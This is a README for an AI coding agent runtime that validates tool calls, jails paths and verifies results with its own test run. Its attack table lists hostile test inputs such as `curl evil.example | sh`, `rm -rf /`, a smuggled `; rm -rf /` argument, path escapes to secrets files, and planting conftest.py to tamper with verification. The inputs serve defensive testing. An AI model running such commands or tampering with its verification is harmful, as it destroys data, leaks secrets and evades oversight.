# repo-engineer: Autonomous Repository Engineer

[![CI](https://github.com/vaibhav3000/repo-engineer/actions/workflows/ci.yml/badge.svg)](https://github.com/vaibhav3000/repo-engineer/actions/workflows/ci.yml)

A verified tool-using coding agent. Given a small repository and an engineering
task, it inspects the repo, plans, edits files through validated tools, runs
the test suite, observes failures, replans, and only declares success when its
own verification run passes.

```mermaid
flowchart TD
    INIT --> ANALYZE_REPO
    ANALYZE_REPO --> PLAN
    PLAN --> ACT["ACT (7 Schema-Validated Tools, Path Jail, AUTO/ASK/DENY Policy Gates)"]
    ACT --> OBSERVE
    OBSERVE --> VERIFY["VERIFY (restore protected files, re-run pytest, require evidence)"]
    VERIFY -->|Tests Pass| COMPLETE
    VERIFY -->|Within Replan Budget| PLAN
    VERIFY -->|Budget Exhausted| FAILED
```

The core design rule: **the planner proposes, the runtime disposes.** The LLM
(or scripted policy) only ever emits tool-call proposals. A deterministic state
machine validates every call against a schema, checks permissions, jails every
path argument inside the workspace, enforces step and replan budgets, and
trusts nothing except the verification run it performs itself.

## Why it matters

Most "AI agent" demos break in one of three ways: they parse free-text tool
calls until the model hallucinates a syntax error, they give the model a shell
prompt, or they accept the model's word that the bug is fixed. This project
addresses all three explicitly:

| Failure mode | Defense in this repo |
|---|---|
| Malformed tool call | `ToolSpec` schema validation (types, ranges, size caps); rejects with structured errors recorded in the trace |
| Arbitrary shell access | no shell tool; `run_tests` accepts only `python -m pytest` with allowlisted flags and workspace test paths, runs the runtime's own interpreter without a shell, with a scrubbed environment, a deadline and a process-tree kill |
| Unverified claims | VERIFY restores protected files and re-runs the suite itself; COMPLETE needs exit status 0 plus a test report with passing tests, and seeded mutants must fail on the add-a-test task |
| Path escapes | paths are checked as text before any filesystem access, then must be direct paths inside the workspace (no links); `.git`, pytest control files and task-protected paths are read-only |
| Infinite loops | step budget + replan budget + planner-error budget -> FAILED |

What this does **not** stop: the tests that `run_tests` executes include code
the agent wrote, and that code runs as the host user with the host's
filesystem and network access. The controls above protect the runtime and keep
the planner's own tool calls inside the workspace; containing test code needs
an OS-level sandbox, which is planned and not built yet. Tool output also
reaches the planner verbatim (apart from redaction of credentials and host
paths), so prompt injection through file contents remains a risk the runtime
bounds but does not remove.

## Two benchmark modes, recorded separately

**Deterministic mode (reproducible).** `python scripts/run_benchmark.py`
runs four software-engineering tasks in isolated workspace copies with the
ScriptedPlanner, which replays fixed recipes that already contain each fix. No
network, no API keys. It exercises the runtime (validation, state machine,
verification, traces), not a model: it solves nothing by itself. The results
and traces carry no paths, timestamps or wall times and regenerate byte for
byte; CI regenerates them on Windows and Linux and fails if `results/`
changes.

| task | success | steps | replans | failed tool calls |
|---|---|---|---|---|
| fix off-by-one loop | yes | 5 | 0 | 0 |
| repair failing test | yes | 5 | 1 | 0 |
| add missing test | yes | 5 | 0 | 0 |
| constrained refactor | yes | 7 | 0 | 0 |

Committed in `results/benchmark_results.json`, with per-task traces in
`results/benchmark_traces/`.

**Real LLM mode.** `python scripts/run_llm_benchmark.py` runs tasks with
`LLMPlanner` (gemini-2.5-flash via an OpenAI-compatible endpoint, temperature
0). The model sees the task, the repository listing, the tool schemas and the
recent history, and answers with a JSON tool call; the runtime validates,
jails and permission-checks every proposal and still requires its own
verification run to declare COMPLETE. Each invocation now writes a new file
under `results/llm_runs/` with a trace per attempt and never overwrites an
earlier run.

The one live run on record (2026-09-17, `results/llm_benchmark_results.json`):

| task | success | steps | LLM calls | failed tool calls | notes |
|---|---|---|---|---|---|
| fix off-by-one loop | yes | 5 | 4 | 0 | edited only shop/cart.py |
| add missing test | yes | 4 | 3 | 0 | wrote its own test file; 2 HTTP 429 errors absorbed |

That run covered two of the four tasks once each, used an earlier revision of
the runtime (before the hardening described here) and kept no trace. The two
429 errors surfaced after the provider client's own retries were exhausted;
the runtime counted them as planner errors within its budget and the task
still completed with verified tests. The file originally reported cumulative
counters for the second task (7 calls); the per-task values above were
computed from those recorded counters, as its `notes` field explains. API keys
come from environment variables, are withheld from test processes and are
redacted from observations, traces and prompts.

**Adversarial tool calls: 36 attempts, 0 breaches.**
`python scripts/run_jail_attacks.py` replays 36 hostile calls against a real
`ToolRegistry` and writes `results/jail_attack_evidence.json`; a test reruns
them and requires that file to match exactly. 29 are rejected before anything
runs, 6 run but gain nothing (the evidence records what was checked), and 1 is
the documented residual.

| category | examples | outcome |
|---|---|---|
| path escape | `../secrets.txt`, `C:/Windows/win.ini`, a UNC path, a `\\?\` device path, a glob above the root | rejected (6) |
| shell commands | `curl evil.example \| sh`, `rm -rf /` | rejected (2) |
| malformed calls | `path=123`, an unknown tool, a boolean line number | rejected (3) |
| test command abuse | `python -m pytestx`, `--junitxml=../x`, `-p plugin`, `--basetemp=../x`, `-c ../x`, `../outside_pkg`, `@args.txt`, `; rm -rf /` | rejected (8) |
| path aliases | `app.py:hidden` (NTFS stream), `app.py. `, `CON` | rejected (3) |
| git metadata | writing or editing `.git/config`; `git_diff` in a repo whose config runs a hook | rejected (2), contained (1) |
| links | reading or writing through a directory link; `search` and `list_tree` across it | rejected (2), contained (3) |
| verification tampering | planting `conftest.py`, editing a protected test | rejected (2) |
| resource limits | a 1 MB+ file, a catastrophic regex | rejected (1), contained (1) |
| credentials | test code reading an API key from the environment | contained (1) |
| agent-written test code | a test that writes a file outside the workspace | **residual (1)**: it succeeds, as documented above |

## Architecture

```mermaid
stateDiagram-v2
    [*] --> INIT
    INIT --> ANALYZE_REPO
    ANALYZE_REPO --> PLAN
    PLAN --> ACT
    PLAN --> VERIFY
    ACT --> OBSERVE
    OBSERVE --> PLAN
    OBSERVE --> VERIFY
    OBSERVE --> REPLAN
    REPLAN --> PLAN
    REPLAN --> FAILED
    VERIFY --> COMPLETE
    VERIFY --> REPLAN
    VERIFY --> FAILED
    PLAN --> FAILED
    INIT --> FAILED
    ANALYZE_REPO --> FAILED
    ACT --> FAILED
    COMPLETE --> [*]
    FAILED --> [*]
```

The edges are exactly the transition table in `state.py`; any other transition
raises.

## Tool call pipeline (every proposal passes all gates)

```mermaid
flowchart TD
    P["planner proposal: ToolCall(name, args)"] --> V{"known tool + schema valid?"}
    V -->|"no"| REJ["rejected Observation (recorded, fed back as history)"]
    V -->|"yes"| POL{"permission policy?"}
    POL -->|"DENY / unapproved ASK"| REJ
    POL -->|"AUTO / approved"| JAIL{"path jail on declared path args"}
    JAIL -->|"escape, alias, link or read-only target"| REJ
    JAIL -->|"inside"| EXEC{"run_tests: command check"}
    EXEC -->|"flag or path not allowed"| REJ
    EXEC -->|"ok, or not run_tests"| RUN["execute"]
    RUN --> OBS["Observation: ok, exit code, redacted output or error, latency"]
    style REJ fill:#f5d5d3
    style RUN fill:#d4f0d4
```

## Verification: the only exit to COMPLETE

```mermaid
flowchart LR
    OBS["OBSERVE / planner says done"] --> RES["restore protected files<br/>and pytest control files"]
    RES --> VER{"VERIFY: run suite,<br/>exit 0 + passing report?"}
    VER -->|"yes (and every seeded<br/>mutant is caught)"| DONE["COMPLETE"]
    VER -->|"no"| REP["REPLAN (budget-limited)"]
    REP --> PLAN["PLAN"]
    REP -->|"replans exhausted"| FAIL["FAILED"]
    style DONE fill:#d4f0d4
    style FAIL fill:#f5d5d3
```

A planner claiming success changes nothing: COMPLETE is reachable only from
VERIFY, and VERIFY runs the suite itself on files the agent could not have
changed. Code under test still shares a process with pytest, so code written
on purpose to forge the test report could pass; that also needs the sandbox.

## Benchmark flow (deterministic and live modes)

```mermaid
flowchart LR
    T["4 tasks: bug fix,<br/>failing test, missing test,<br/>refactor"] --> C["fresh workspace copy<br/>per task (isolation)"]
    C --> R["AgentRuntime:<br/>ScriptedPlanner or live Gemini"]
    R --> V["VERIFY: task test suite"]
    V --> RES["results/benchmark_results.json<br/>(deterministic: 4/4)<br/>results/llm_benchmark_results.json<br/>(live: 2/2, one run)"]
    style V fill:#d4f0d4
```

Deterministic results and live-LLM results are recorded in separate files and
never mixed.

Components (src/repo_engineer/):

- `state.py`: `State` enum, legal-transition table, serializable `AgentState`,
  `StateMachine` with step and replan budgets.
- `tools.py`: `ToolSpec` schemas and `ToolRegistry` with `list_tree`,
  `search`, `read_file`, `apply_edit`, `write_file`, `git_diff` and
  `run_tests`; permission classes (READ_ONLY / MUTATING / EXECUTION) with
  AUTO / ASK / DENY policies (AUTO by default), central path jailing,
  protected paths and the verification run.
- `jail.py`: the lexical path rules. `process.py`: child environment,
  bounded output and process-tree kill. `redaction.py`: removes credentials
  and host paths from output. `snapshot.py`: the starting snapshot behind
  `git_diff` and file restoration.
- `planner.py`: `Planner` ABC; `ScriptedPlanner` (recipes, used by the
  benchmark), `LLMPlanner` (live LLM, requires explicit environment
  configuration) and `RecordedPlanner` (test double).
- `agent.py`: `AgentRuntime`, the loop described above, plus JSON trace export.
- `benchmark/`: the harness, the four task repos (with protected paths and,
  for the add-a-test task, seeded mutants), the live-run recorder and the
  jail-attack generator.

## Technical Report

A concise IEEE-style technical paper documenting this system is available at
[reports/Autonomous_Repository_Engineer.pdf](reports/Autonomous_Repository_Engineer.pdf),
with LaTeX source included under `reports/`.

## Honest limitations

- Test execution is code execution. Agent-written tests run as the host user
  with the host's filesystem and network access; the runtime's controls
  (environment allowlist, deadline, tree kill, output bound) protect the
  runtime, not the host. On POSIX a process that starts its own session also
  escapes the tree kill. An OS-level sandbox is the planned fix.
- The scripted benchmark replays known fixes; it measures the runtime, not
  problem solving. The live run is the problem-solving evidence and is small:
  two tasks, once each, on an earlier runtime revision.
- Write-time link checks narrow, but do not close, the race with a
  concurrent process (such as leftover test code) that swaps a directory for
  a link.
- Sequential file edits are the only mutation model; there is no multi-file
  transactional rollback (the trace records every change for review).
- There is no command-line entry point for pointing the agent at an arbitrary
  repository yet; the benchmark scripts are the entry points.

## Reproducibility

```bash
python -m pip install -e ".[dev]"
python -m pytest -q                    # 181 tests (180 on Linux: one case is Windows-only)
python scripts/run_benchmark.py        # 4/4 tasks; rewrites results/ byte for byte
python scripts/run_jail_attacks.py     # 36 attacks, 0 breaches; rewrites the evidence file
ruff check . && ruff format --check . && pyright
```

Environment: Python >= 3.11. The only runtime dependency is pytest, because
`run_tests` and VERIFY start pytest with the runtime's own interpreter.

## Project structure

```
src/repo_engineer/       state.py tools.py jail.py process.py redaction.py snapshot.py
                         planner.py llm_provider.py agent.py benchmark/
benchmark/tasks/         four self-contained task repos (task.json + code + tests)
tests/                   runtime, jail, run_tests, verification, provider and harness tests
results/                 committed benchmark output, traces and attack evidence
docs/                    design_faq.md, architecture.md
```

## License

MIT. See LICENSE.

## Docker (a clean Linux environment, not a sandbox)

```bash
docker build -t repo-engineer .
docker run --rm --network none repo-engineer          # deterministic benchmark
docker build --target test -t repo-engineer-test .
docker run --rm --network none repo-engineer-test     # test suite
```

The image is pinned by digest and runs as an unprivileged user. It does not
sandbox `run_tests`: inside it, agent-written test code still runs with the
container user's rights, which is why the commands above disable networking.
